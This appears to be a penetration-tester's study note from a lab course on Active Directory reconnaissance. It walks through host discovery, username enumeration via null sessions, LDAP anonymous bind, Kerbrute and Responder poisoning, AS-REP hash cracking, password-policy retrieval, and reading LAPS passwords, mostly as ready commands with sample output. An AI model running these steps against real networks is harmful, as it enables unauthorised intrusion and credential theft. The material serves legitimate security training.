---

---
### Content
1. [Identifying Live Hosts](#identifying-live-hosts)
2. [Internal AD Username Enumeration](#internal-ad-username-enumeration)
3. [Enumerating & Retrieving Password Policies](#enumerating-&-retrieving-password-policies)
	1. [From Linux](#from-linux)
	2. [From Windows](#from-windows)
4. [Enumerating Security Controls](#enumerating-security-controls)
---
## Identifying Live Hosts

If we have a compromised host inside the domain, we can run `wireshark` or `tcpdump` to listen to the network
``` bash
$ sudo -E wireshark
$ sudo tcpdump -i <network_interface>
# Watch for MDNS and ARP packets

$ sudo responder -I <network_interface> -A

# Check live hosts
$ fping -asgq 172.16.5.0/23

# After creating a list from the live hosts from fping, scan them with nmap
$ sudo nmap -v -A -iL hosts.txt -oN output.txt
```
---
## Internal AD Username Enumeration
Gathering usernames list for the password spray can be done with several ways:
- Leverage `SMB NULL session` to retrieve a complete list of domain users from the domain controller.
- Leverage `LDAP anonymous bind` to query LDAP anonymously and pull down the domain user list.
- Use `Kerbrute` to validate users utilizing a word list
	- from a source such as the [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames).
	- gathered by using a tool such as [linkedin2username](https://github.com/initstring/linkedin2username) to create a list of potentially valid user.
- Use `Responder` to conduct LLMNR,NBT-NS poisoning to obtain set of credentials.

``` bash
# Abuse SMB NULL session
$ enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

$ rpcclient -U "" -N 172.16.5.5
rpcclient $> enumdomusers 
# Copy the output to a file, then clean the output to have only the usernames
$ cat rpc-output | cut -f2 -d "[" | cut -f1 -d "]" > clean-rpc-output

$ crackmapexec smb 172.16.5.5 --users

# Abuse LDAP Anonymous bind
$ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "

$ ./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```

#### Kerbrute
- [Kerbrute](https://github.com/ropnop/kerbrute) can be a stealthier option for domain account enumeration.
- Kerbrute sends a request for TGT ticket to the KDC without Kerberos Pre-Authentication to perform username enumeration.
	- If the KDC responded with the error PRINCIPAL UNKNOWN, the username is invalid.
	- If the KDC prompts for Kerberos Pre-Authentication, this signals that the username exists.
	- If the KDC responded with an AS-REP message, this signals that the user is vulnerable to AS-REP Roasting. 
- Using `jsmith.txt` or `jsmith2.txt` user lists from [Insidetrust](https://github.com/insidetrust/statistically-likely-usernames).

``` bash
$ sudo git clone https://github.com/ropnop/kerbrute.git
$ make help
$ make all
$ ./kerbrute_linux_amd64 userenum -d inlanefreight.local --dc 172.16.5.5 jsmith.txt > valid_ad_users
# To clean the output for further use:
$ awk '/VALID USERNAME:/ {split($NF,a,"@"); print a[1]}' valid_ad_users > clean
```

If a user has no pre auth required and Kerbrute extracted his krb5asrep, we can brute force his plain text password
``` Bash
# Add the hash to a file
$ cat > krb5asrep_file
# Crack it with john
$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep krb5asrep_file
```


Using Kerbrute for username enumeration will generate event ID [4768: A Kerberos authentication ticket (TGT) was requested](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4768). This will only be triggered if [Kerberos event logging](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/enable-kerberos-event-logging) is enabled via Group Policy. Defenders can tune their SIEM tools to look for an influx of this event ID, which may indicate an attack.

There is also [linkedin2username](https://github.com/initstring/linkedin2username) to mash up possible usernames from a company's LinkedIn page.

---
## Enumerating & Retrieving Password Policies


> If you are on an internal machine but don’t have valid domain credentials, you can look for SMB NULL sessions or LDAP anonymous binds on Domain Controllers.
> If we have an SMB NULL session, LDAP anonymous bind, or a set of valid credentials, we can enumerate the password policy.
#### From Linux
``` bash
# Enumerating the Password Policy - Credentialed
$ crackmapexec smb <ip> -u username -p Password --pass-pol

# Enumerating the Password Policy - SMB NULL Sessions

# We can use rpcclient to check a Domain Controller for SMB NULL session access.
$ rpcclient -U "" -N <IP>
# Once connected, we can issue an RPC command such as querydominfo to obtain information about the domain and confirm NULL session access.
rpcclient $> querydominfo
# Obtaining the Password Policy using rpcclient
rpcclient $> getdompwinfo

# Using enum4linux and enum4linux-ng (a rewrite of enum4linux in Python with more features)
$ enum4linux -P 172.16.5.5
$ enum4linux-ng -P 172.16.5.5 -oA output.txt

# Enumerating the Password Policy - LDAP Anonymous Bind 
$ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

#### From Windows
``` powershell
# Enumerating SMB Null Session
# Establish a null session from a windows machine and confirm if we can perform more of this type of attack.
PS C:\> net use \\DC01\ipc$ "" /u:""
The command completed successfully.

# We can also use a username/password combination to attempt to connect.
PS C:\> net use \\DC01\ipc$ "password" /u:guest

# Enumerating the Password Policy - net.exe
PS C:\> net accounts

# Enumerating the Password Policy - PowerView.ps1
PS C:\> import-module .\PowerView.ps1
PS C:\> Get-DomainPolicy
```

---
## Enumerating Security Controls

Checking the Status of Defender with Get-MpComputerStatus
``` Powershell
# Check if RealTimeProtectionEnabled parameter is set to True, which means Defender is enabled on the system.
PS C:\> Get-MpComputerStatus
```

Using Get-AppLockerPolicy cmdlet we can see which applications or directories are whitelisted and blacklisted for users to use.
``` Powershell
PS C:\> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

PathConditions      : {%SYSTEM32%\WINDOWSPOWERSHELL\V1.0\POWERSHELL.EXE}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 3d57af4a-6cf8-4e5b-acfc-c2c2956061fa
Name                : Block PowerShell
Description         : Blocks Domain Users from using PowerShell on workstations
UserOrGroupSid      : S-1-5-21-2974783224-3764228556-2640795941-513
Action              : Deny
```

PowerShell [Constrained Language Mode](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) locks down many of the features needed to use PowerShell effectively, such as blocking COM objects, only allowing approved .NET types, XAML-based workflows, PowerShell classes, and more.
``` Powershell
PS C:\> $ExecutionContext.SessionState.LanguageMode

ConstrainedLanguage
```

### LAPS
[Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) is used to randomize and rotate local administrator passwords on Windows hosts and prevent lateral movement.

enumerate what domain users can read the LAPS password set for machines with LAPS installed and what machines do not have LAPS installed. 
The [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) greatly facilitates this with several functions.
``` Powershell
# Enumerate the delegated groups which have access to LAPS passwords  
PS C:\> Find-LAPSDelegatedGroups
OrgUnit                                             Delegated Groups
-------                                             ----------------
OU=Servers,DC=DOMAIN,DC=LOCAL                DOMAIN\Domain Admins
OU=Servers,DC=DOMAIN,DC=LOCAL                DOMAIN\LAPS Admins
OU=Workstations,DC=DOMAIN,DC=LOCAL           DOMAIN\Domain Admins

# Check rights on each computer with LAPS enabled for any groups with read access and users with "All Extended Rights."
PS C:\htb> Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
EXCHG01.DOMAIN.LOCAL DOMAIN\Domain Admins Delegated
EXCHG01.DOMAIN.LOCAL DOMAIN\LAPS Admins   Delegated

# Search for computers that have LAPS enabled when passwords expire, and even the randomized passwords in cleartext if our user has access.
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN.LOCAL           6DZ[+A/[]19d$F 08/26/2020 23:29:45
EXCHG01.DOMAIN.LOCAL        oj+2A+[hHMMtj, 09/26/2020 00:51:30
```
---